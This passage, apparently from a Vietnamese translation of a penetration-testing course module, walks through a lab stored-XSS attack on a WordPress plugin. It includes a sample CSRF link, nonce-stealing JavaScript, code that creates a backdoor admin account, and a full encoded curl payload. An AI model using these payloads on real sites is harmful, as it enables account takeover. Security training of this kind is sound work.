Để thành công với hướng tấn công này, ta cần kết hợp thêm một lớp tấn công ứng dụng web khác.

Để phát triển cuộc tấn công, ta sẽ xây dựng một kịch bản tương tự như mô tả bởi Shift8. Trước tiên, ta sẽ tạo một hàm JS lấy nonce của WordPress.

Nonce là một token do server tạo, được đưa vào mỗi yêu cầu HTTP để thêm tính ngẫu nhiên và ngăn chặn các cuộc tấn công Cross-Site-Request-Forgery (CSRF).

Một cuộc tấn công CSRF xảy ra thông qua social engineering khi nạn nhân nhấp vào một liên kết độc hại thực hiện một hành động đã được cấu hình sẵn thay mặt người dùng.

Liên kết độc hại có thể được ngụy trang bằng một mô tả có vẻ vô hại, dụ dỗ nạn nhân nhấp vào nó.

```html
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
```

                                                              *Danh sách 26 - Ví dụ tấn công CSRF*

Trong ví dụ trên, URL trỏ tới API của Fake Crypto Bank, thực hiện chuyển bitcoin tới tài khoản attacker. Nếu liên kết này được nhúng trong mã HTML của một email, người dùng chỉ thấy mô tả liên kết, chứ không thấy tài nguyên HTTP thực tế mà nó trỏ tới. Cuộc tấn công này sẽ thành công nếu người dùng đã đăng nhập với một phiên hợp lệ trên cùng website.

Trong trường hợp của chúng ta, bằng cách bao gồm và kiểm tra nonce ngẫu nhiên giả, WordPress ngăn chặn loại tấn công này, vì kẻ tấn công không thể biết trước token. Tuy nhiên, như ta sẽ giải thích, nonce sẽ không cản trở được lỗ hổng XSS đã lưu mà ta phát hiện trong plugin.

Như đã nêu, để thực hiện bất kỳ hành động quản trị nào, ta cần trước tiên thu thập nonce. Ta có thể làm điều này bằng hàm JavaScript sau:

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

                                                    *Danh sách 27 - Lấy Nonce của WordPress*

Hàm này thực hiện một yêu cầu HTTP mới tới URL `/wp-admin/user-new.php` và lưu giá trị nonce tìm thấy trong phản hồi HTTP bằng biểu thức chính quy (regular expression). Mẫu regex khớp bất kỳ giá trị chữ-số nào nằm giữa chuỗi `/ser" value="` và dấu nháy đôi.

Bây giờ ta đã lấy nonce động, ta có thể tạo hàm chính chịu trách nhiệm tạo tài khoản admin mới:

```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

                                             *Danh sách 28 - Tạo tài khoản quản trị WordPress mới*

Đoạn code nổi bật là tài khoản admin bị backdoor mới, ngay sau nonce ta đã thu thập. Nếu cuộc tấn công thành công, ta sẽ có quyền quản trị toàn bộ cài đặt WordPress.

Để đảm bảo payload JavaScript của ta được Burp và ứng dụng mục tiêu xử lý đúng, ta cần trước tiên minify (nén thành một dòng), rồi mã hóa nó.

Để minify mã tấn công thành một dòng, ta có thể dùng JS Compress.8

![image.png](image%2035.png)

                                                  *Figure 30: Minifying the XSS attack code*

Sau khi nhấp Compress JavaScript, ta sẽ sao chép output và lưu cục bộ.

Bước tấn công cuối cùng, ta sẽ mã hóa mã JS đã minify để bất kỳ ký tự không hợp lệ nào cũng không gây can thiệp khi gửi payload. Ta có thể làm điều này bằng hàm sau:

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }

let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

                                                   *Danh sách 29 - Hàm JS mã hóa chuỗi JS*

Hàm `encode_to_javascript` sẽ phân tích chuỗi JS đã minify được truyền vào và chuyển mỗi ký tự thành mã số nguyên UTF-16 tương ứng bằng phương thức `charCodeAt`.

Hãy chạy hàm trong console của trình duyệt.

![image.png](image%2036.png)

                                 *Figure 31: Encoding the Minified JS with the Browser Console*

Ta sẽ giải mã và thực thi chuỗi đã mã hóa bằng cách giải mã chuỗi với phương thức `fromCharCode` rồi chạy nó qua `eval()`. Sau khi sao chép chuỗi đã mã hóa, ta có thể chèn nó bằng lệnh curl sau và phóng cuộc tấn công:

```
kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080

```

                                   *Danh sách 30 - Phóng cuộc tấn công XSS cuối cùng qua Curl*

Trước khi chạy lệnh curl, hãy khởi động Burp và để Intercept bật.

Chúng ta đã hướng dẫn curl gửi một yêu cầu HTTP được chế tạo đặc biệt với header User-Agent chứa payload độc hại, rồi chuyển tiếp nó tới instance Burp để ta có thể kiểm tra thêm.

Sau khi chạy lệnh curl, ta có thể kiểm tra yêu cầu trong Burp.

![image.png](image%2037.png)

                                                        *Figure 32: Inspecting the Attack in Burp*

Mọi thứ có vẻ đúng, vậy hãy Forward yêu cầu bằng cách nhấp Forward, rồi tắt Intercept.

Tại thời điểm này, exploit XSS của ta đã được lưu vào cơ sở dữ liệu WordPress. Ta chỉ cần mô phỏng việc thực thi bằng cách đăng nhập vào OffSec WP với tư cách admin, rồi nhấp vào dashboard plugin Visitors ở góc trái dưới.

![image.png](image%2038.png)

                                                                  *Figure 33: Loading Visitors Statistics*

Ta nhận thấy chỉ có một bản ghi hiện diện, và dường như không có User-Agent nào được ghi lại. Điều này vì trường User-Agent chứa attack nhúng trong thẻ `<script>`, nên trình duyệt không thể hiển thị chuỗi văn bản từ đó.

Bằng cách tải thống kê plugin, ta lẽ ra đã thực thi script độc hại, vậy hãy xác nhận cuộc tấn công thành công bằng cách nhấp vào menu Users ở khung bên trái.

![image.png](image%2039.png)

                                                *Figure 34: Confirming that our Attack Succeeded*

Tuyệt vời! Nhờ lỗi XSS này, chúng ta đã leo thang đặc quyền từ một người dùng bình thường lên quản trị thông qua một yêu cầu HTTP được chế tạo đặc biệt.

Ta có thể tiếp tục cuộc tấn công và truy cập vào host cơ sở bằng cách tạo một plugin WordPress tùy chỉnh có web shell nhúng. Chúng ta sẽ đi sâu hơn về web shell trong một Mô-đun khác.

---

# 5. Kết luận

---

Trong Mô-đun này, chúng ta tập trung vào việc nhận diện và liệt kê các lỗ hổng ứng dụng web phổ biến. Chúng ta cũng đã khai thác một số lỗ hổng ứng dụng web thông dụng, bao gồm cấu hình API sai và Cross-Site Scripting.

Chúng ta kết thúc Mô-đun bằng việc lợi dụng một lỗ hổng XSS để giành quyền quản trị trên một ứng dụng web dễ bị tấn công thông qua một yêu cầu HTTP được chế tạo đặc biệt.

---

# 6. Luyện tập

---

## TryHackMe

---

[XSS](https://tryhackme.com/room/axss)

---

## PortSwigger

---

[What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)

---

# 7. WriteUp

---

['Labs/Introduction to Web Application Attacks' 카테고리의 글 목록](https://longhd.tistory.com/category/Labs/Introduction%20to%20Web%20Application%20Attacks)